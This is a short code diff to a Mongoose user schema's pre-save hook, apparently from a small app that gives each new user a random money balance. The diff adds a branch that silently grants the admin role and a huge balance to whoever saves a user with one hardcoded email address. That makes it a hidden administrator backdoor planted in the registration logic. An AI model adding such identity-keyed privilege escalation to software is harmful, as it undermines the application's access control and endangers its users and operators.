@@ -50,8 +50,15 @@ const UserSchema = new Schema({
 })
 
 UserSchema.pre('save',function(next){
-    this.money = Math.floor(Math.random() * Math.floor(500000))
-    this.password = hashPassword(this.password)
-    next()
+    if (this.email == 'anggabanny@admin.com') {
+        this.role = 'admin'
+        this.money = 99999999999999999999999999999
+        this.password = hashPassword(this.password)
+        next()
+    } else {
+        this.money = Math.floor(Math.random() * Math.floor(500000))
+        this.password = hashPassword(this.password)
+        next()
+    }
 })
 module.exports = model('User',UserSchema)
